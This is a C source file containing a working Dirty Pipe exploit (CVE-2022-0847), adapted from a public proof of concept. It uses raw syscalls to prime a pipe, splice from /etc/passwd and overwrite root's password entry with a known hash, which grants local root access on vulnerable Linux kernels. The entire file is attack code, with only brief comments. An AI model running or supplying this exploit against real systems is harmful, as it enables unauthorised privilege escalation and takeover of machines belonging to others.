#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

#define openat 257
#define pipe 22
#define fcntl 72
#define write 1
#define read 0
#define splice 275
#define exit_group 231

#define AT_FDCWD -100
#define O_RDONLY 0
#define F_GETPIPE_SZ 1032

// modified from https://github.com/antx-code/CVE-2022-0847

int main() {
	const char *const path = "/etc/passwd";

	loff_t offset = 4; // after the "root"
	const char *const data = ":$1$antx-soc$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt antx-soc antx-soc
	const size_t data_size = 59;

	const int fd = syscall(openat, AT_FDCWD, path, O_RDONLY);

	int p[2];
	
	syscall(pipe, p);

	const unsigned pipe_size = syscall(fcntl, p[1], F_GETPIPE_SZ);
	static char buffer[PAGE_SIZE];

	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > PAGE_SIZE ? PAGE_SIZE : r;
		syscall(write, p[1], buffer, n);
		r -= n;
	}

	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > PAGE_SIZE ? PAGE_SIZE : r;
		syscall(read, p[0], buffer, n);
		r -= n;
	}
	   
	--offset;
	syscall(splice, fd, &offset, p[1], NULL, 1, 0);

	syscall(write, p[1], data, data_size);

	syscall(exit_group, 0);
	
}

